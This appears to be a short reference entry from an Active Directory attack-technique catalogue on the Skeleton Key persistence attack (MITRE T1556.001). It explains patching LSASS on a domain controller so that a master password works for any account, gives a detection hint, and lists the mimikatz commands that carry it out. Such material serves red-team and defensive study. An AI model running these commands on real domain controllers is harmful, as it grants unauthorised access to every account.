---
id: skeleton_key
type: technique
label: "Skeleton key"
phase: "persist"
tools: ["mimikatz"]
cve: null
detect: "LSASS memory modification on a DC — rare, very high-signal."
mitre: "T1556.001"
tag: null
---


# Skeleton key

### Affected object / attribute
**LSASS authentication process** on a DC.

### Concept (deep)
Patch LSASS on the DC so a **master password** works for **any** account alongside the real password. Memory-resident; **does not survive reboot**. Requires DC code execution.

### Commands
```plaintext
mimikatz # privilege::debug
mimikatz # misc::skeleton
